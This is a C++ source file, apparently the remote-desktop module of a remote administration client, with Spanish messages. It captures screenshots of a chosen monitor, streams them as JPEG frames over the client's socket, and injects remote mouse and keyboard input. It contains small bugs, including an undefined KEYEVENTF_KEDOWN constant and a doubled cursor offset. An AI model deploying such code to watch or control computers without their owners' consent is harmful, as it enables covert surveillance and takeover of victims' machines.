#include "cliente.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

std::vector<Monitor> tmp_Monitores;

void Print_Mouse_Command(int x, int y, int monitor_index, int mouse_action) {
    std::cout << "X: " << x << "\nY:" << y << "Monitor: " << monitor_index << "\nAction: " << mouse_action << "\n";
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

bool mod_RemoteDesktop::m_isRunning() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    return this->isRunning;
}

void mod_RemoteDesktop::m_UpdateVmouse(bool isVisible) {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->isMouseOn = isVisible;
}

bool mod_RemoteDesktop::m_Vmouse() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->isMouseOn;
}

void mod_RemoteDesktop::m_RemoteMouse(int x, int y, int monitor_index, int mouse_action) {
    Print_Mouse_Command(x, y, monitor_index, mouse_action);
    Monitor monitor = this->m_GetMonitor(monitor_index);
    if (monitor.rectData.resWidth > 0) {
        SetCursorPos(x, y);
        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        DWORD dwFlag = 0; //MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE;
        switch (mouse_action) {
            case EnumRemoteMouse::_LEFT_DOWN:
                dwFlag = MOUSEEVENTF_LEFTDOWN;
                break;
            case EnumRemoteMouse::_LEFT_UP:
                dwFlag = MOUSEEVENTF_LEFTUP;
                break;
            case EnumRemoteMouse::_RIGHT_DOWN:
                dwFlag = MOUSEEVENTF_RIGHTDOWN;
                break;
            case EnumRemoteMouse::_RIGHT_UP:
                dwFlag = MOUSEEVENTF_RIGHTUP;
                break;
            case EnumRemoteMouse::_MIDDLE_DOWN:
                dwFlag = MOUSEEVENTF_MIDDLEDOWN;
                break;
            case EnumRemoteMouse::_MIDDLE_UP:
                dwFlag = MOUSEEVENTF_MIDDLEUP;
                break;
            case EnumRemoteMouse::_WHEEL_DOWN:
            case EnumRemoteMouse::_WHEEL_UP:
                dwFlag = MOUSEEVENTF_WHEEL;
                break;
            default:
                break;
        }

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dwFlags = dwFlag;
        if (mouse_action == EnumRemoteMouse::_WHEEL_DOWN) {
            inputs[0].mi.mouseData = -120;
        }else if (mouse_action == EnumRemoteMouse::_WHEEL_UP) {
            inputs[0].mi.mouseData = 120;
        }
        SendInput(1, inputs, sizeof(INPUT));
        /*
         
        Metodo 2
        int normalized_x = ((x - monitor.rectData.xStart) * 65535) / monitor.rectData.resWidth;
        int normalized_y = ((y - monitor.rectData.yStart) * 65535) / monitor.rectData.resHeight;

        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dx = normalized_x;
        inputs[0].mi.dy = normalized_y;
        inputs[0].mi.dwFlags = MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
        */
        //UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
        //if (uSent != ARRAYSIZE(inputs)) {
        //   DebugPrint("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
        //}
        
    }else {
        DebugPrint("[X] El monitor seleccionado no existe", monitor_index);
    }
}

void mod_RemoteDesktop::m_RemoteTeclado(char key, bool isDown) {
    INPUT inputs[1] = {};
    ZeroMemory(inputs, sizeof(inputs));

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = key;
    inputs[0].ki.dwFlags = isDown ? KEYEVENTF_KEDOWN : KEYEVENTF_KEYUP;
    
    SendInput(1, inputs, sizeof(INPUT));
}

void mod_RemoteDesktop::InitGDI() {
    if (Gdiplus::GdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
        this->isGDIon = true;
    }
}

void mod_RemoteDesktop::StopGDI() {
    Gdiplus::GdiplusShutdown(this->gdiplusToken);
}

ULONG mod_RemoteDesktop::m_Quality() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->uQuality;
}

void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
    //32 default
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->uQuality = iNew == 0 ? 32 : static_cast<ULONG>(iNew);
}

mod_RemoteDesktop::mod_RemoteDesktop() {
    this->InitGDI();
	return;
}

mod_RemoteDesktop::~mod_RemoteDesktop() {
    this->StopGDI();
    return;
}

std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
    std::vector<char> cBuffer;

    Monitor monitor = this->m_GetMonitor(index);
    if (monitor.rectData.resHeight == 0) {
        DebugPrint("[X] El monitor no es valido o no se ha obtenido al lista");
        return cBuffer;
    }
    
    if (!this->isGDIon) {
        DebugPrint("GDI no esta inicializado, init...");
        this->InitGDI();
        if (!this->isGDIon) {
            DebugPrint("[X] No se pudo iniciar...");
            return cBuffer;
        }
    }
    
    HDC hdcMonitor = GetDC(NULL);
    HDC hdcMemDC;
    HWND hDesktopWnd = GetDesktopWindow();
    HBITMAP hmpScreen = NULL;

    Gdiplus::Bitmap* pScreenShot = nullptr;
    IStream* oStream;
    HRESULT hr = S_OK;
    
    //Cursor
    CURSORINFO cursor = { sizeof(cursor) };
    ICONINFO info = { sizeof(info) };
    RECT cursorRect;
    int cursorX = 0;
    int cursorY = 0;
    BITMAP bmpCursor = { 0 };
    

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        goto EndSec;
    }

    if (!hdcMonitor) {
        DebugPrint("GetDC failed\n");
        goto EndSec;
    }

    hdcMemDC = CreateCompatibleDC(hdcMonitor);
    if (!hdcMemDC) {
        DebugPrint("GetcomtabielDC failed\n");
        goto EndSec;
    }

    hmpScreen = CreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
    if (!hmpScreen) {
        DebugPrint("Createcompatiblebitmap failed\n");
        goto EndSec;
    }
    if (!SelectObject(hdcMemDC, hmpScreen)) {
        DebugPrint("select object failed\n");
        goto EndSec;
    }
    if (!BitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
        DebugPrint("bitblt failed\n");
        goto EndSec;
    }

    //Si esta habilitado mostrar el mouse
    if (this->m_Vmouse()) {
        GetCursorInfo(&cursor);
        if (cursor.flags == CURSOR_SHOWING) {
            GetWindowRect(hDesktopWnd, &cursorRect);
            GetIconInfo(cursor.hCursor, &info);
            cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
            cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
            GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
            DrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
        }
    }

    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        DebugPrint("CreateStreamOnHGlobal error\n");
        goto EndSec;
    }

    STATSTG statstg;
    CLSID imageCLSID;
    
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    
    pScreenShot = new Gdiplus::Bitmap(hmpScreen, (HPALETTE)NULL);

    if (!pScreenShot) {
        DebugPrint("No se pudo reservar memoria para crear el bitmap");
        goto EndSec;
    }

    if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
        DebugPrint("No se pudo guardar el buffer al stream");
        goto EndSec;
    }

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr == S_OK) {
        ULONG bytes_read = 0;
        unsigned long long int uiBuffsize = statstg.cbSize.LowPart;
        cBuffer.resize(uiBuffsize);
        if (cBuffer.size() == uiBuffsize) {
            oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
            hr = oStream->Read(cBuffer.data(), uiBuffsize, &bytes_read);
        }
    }

EndSec:

    if (pScreenShot) {
        delete pScreenShot;
        pScreenShot = nullptr;
    }

    if (hdcMonitor) {
        ReleaseDC(NULL, hdcMonitor);
    }

    if (hdcMemDC) {
        DeleteDC(hdcMemDC);
    }
    if (hmpScreen) {
        DeleteObject(hmpScreen);
    }

    return cBuffer;

}

void mod_RemoteDesktop::SpawnThread(int quality, int monitor_index) {
    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality, monitor_index);
}

void mod_RemoteDesktop::DetenerLive() {
    DebugPrint("[RD] Apagando...");
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    this->isRunning = false;
    lock.unlock();
    DebugPrint("[RD] Joining thread...");
    if (this->th_RemoteDesktop.joinable()) {
        this->th_RemoteDesktop.join();
    }
    DebugPrint("[RD] Done omar :v");
}

void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
    this->isRunning = true;
    this->m_UpdateQuality(quality);
    std::vector<char> cOldBuffer;
    while (this->m_isRunning()) {
        
        std::vector<char> scrBuffer = this->getFrameBytes(this->m_Quality(), monitor_index);
        if (scrBuffer.size() > 0) {
            if(this->m_AreEqual(scrBuffer, cOldBuffer)){
                //buffers are equal
                std::this_thread::sleep_for(std::chrono::milliseconds(30));
                continue;
            }
            cOldBuffer = scrBuffer;
            int iSent = cCliente->cChunkSend(cCliente->sckSocket, scrBuffer.data(), scrBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
            if (iSent == -1) {
                break;
            }
        }else {
            DebugPrint("Hubo un error creando el buffer. Esperando...");
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
    }
}

bool mod_RemoteDesktop::m_AreEqual(const std::vector<char>& cBuffer1, const std::vector<char>& cBuffer2) {
    if (cBuffer1.size() == cBuffer2.size()) {
        int iSize = cBuffer1.size();
        for (int iPos = 0; iPos < iSize; iPos++) {
            if (cBuffer1[iPos] != cBuffer2[iPos]) {
                return false;
            }
        }
        return true;
    }
    return false;
}

std::vector<char> mod_RemoteDesktop::m_Diff(const std::vector<char>& cBuffer1, const std::vector<char>& cBuffer2) {
    std::vector<char> cOutput;
    return cOutput;
}

std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
    this->m_Clear_Monitores();
    
    EnumDisplayMonitors(NULL, NULL, this->MonitorEnumProc, 0);
    
    for (Monitor monitor : tmp_Monitores) {
        this->m_Agregar_Monitor(monitor);
    }
    tmp_Monitores.clear();

    return this->m_GetVectorCopy();
}

BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT rectMonitor, LPARAM lparam) {
    MONITORINFOEX info;
    Monitor new_Monitor;
    info.cbSize = sizeof(MONITORINFOEX);
    int width = rectMonitor->right - rectMonitor->left;
    int height = rectMonitor->bottom - rectMonitor->top;
    new_Monitor.rectData.resWidth = width;
    new_Monitor.rectData.resHeight = height;
    new_Monitor.rectData.xStart = rectMonitor->left;
    new_Monitor.rectData.yStart = rectMonitor->top;
    ZeroMemory(new_Monitor.szDevice, sizeof(new_Monitor.szDevice));
    if (GetMonitorInfo(hMonitor, &info)) {
        memcpy(new_Monitor.szDevice, info.szDevice, sizeof(new_Monitor.szDevice) - 1);
    }
    tmp_Monitores.push_back(new_Monitor);

    return TRUE;
}

void mod_RemoteDesktop::m_Agregar_Monitor(Monitor& new_monitor) {
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.push_back(new_monitor);
}

void mod_RemoteDesktop::m_Clear_Monitores(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.clear();
}

Monitor mod_RemoteDesktop::m_GetMonitor(int index){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    if (index < this->vc_Monitores.size()) {
        return this->vc_Monitores[index];
    }
    Monitor dummy;
    return dummy;
}

std::vector<Monitor> mod_RemoteDesktop::m_GetVectorCopy(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    return this->vc_Monitores;
}